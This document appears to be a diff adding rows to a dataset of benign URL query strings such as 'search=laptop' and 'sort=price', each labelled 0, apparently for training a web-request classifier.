+category=books&subcategory=fiction&author=unknown&year=2023,0
+page=2,0
+category=books&subcategory=fiction&author=unknown&year=2023,0
+name=John+Smith,0
+a=,0
+ref=homepage,0
+username=sara123,0
+category=electronics,0
+category=electronics,0
+q=test,0
+ref=homepage,0
+currency=USD,0
+email=user@example.com,0
+limit=10&offset=20,0
+username=sara123,0
+sort=price,0
+a=b,0
+"filter=color:blue,size:large&category=clothing&page=2&limit=20",0
+currency=USD,0
+=b,0
+sort=price,0
+keyword=machine+learning,0
+search=laptop,0
+page=1,0
+product?id=25,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+currency=USD,0
+product?id=100,0
+x=1,0
+a=,0
+limit=10&offset=20,0
+post_id=7,0
+username=ali,0
+view=grid,0
+name=John+Smith,0
+q=test,0
+order_id=1234,0
+ref=homepage,0
+=b,0
+post_id=7,0
+page=home,0
+search=book,0
+sort=price,0
+a=b,0
+ref=homepage,0
+ref=homepage,0
+=b,0
+"filter=color:blue,size:large&category=clothing&page=2&limit=20",0
+limit=10&offset=20,0
+username=sara123,0
+page=2,0
+page=2,0
+ref=homepage,0
+theme=dark,0
+,0
+product?id=100,0
+x=1,0
+view=grid,0
+username=sara123,0
+name=John+Smith,0
+sort=price,0
+page=2,0
+page=home,0
+ref=homepage,0
+product?id=25,0
+category=clothing,0
+order_id=1234,0
+x=1,0
+a=b,0
+product?id=25,0
+order_id=1234,0
+a=,0
+user_id=15,0
+limit=10&offset=20,0
+products id=42&category=electronics id=42 category=electronics,0
+page=2,0
+ref=homepage,0
+a=,0
+post_id=7,0
+item=42&qty=3,0
+view=grid,0
+product?id=25,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+search=laptop,0
+page=home,0
+a=,0
+search=book,0
+search=running+shoes&category=sports&sort=price&order=asc,0
+"filter=color:blue,size:large&category=clothing&page=2&limit=20",0
+a=,0
+search=running+shoes&category=sports&sort=price&order=asc,0
+products id=42&category=electronics id=42 category=electronics,0
+theme=dark,0
+product?id=25,0
+product?id=100,0
+category=electronics,0
+=b,0
+keyword=machine+learning,0
+age=25,0
+user_id=1023&order_id=98123&status=shipped&tracking=yes,0
+sort=price,0
+city=Tehran,0
+item=42&qty=3,0
+filter=price&sort=asc,0
+product?id=25,0
+user_id=15,0
+product?id=25,0
+=b,0
+city=Tehran,0
+query=python+programming,0
+search=laptop,0
+order_id=1234,0
+page=1,0
+"filter=color:blue,size:large&category=clothing&page=2&limit=20",0
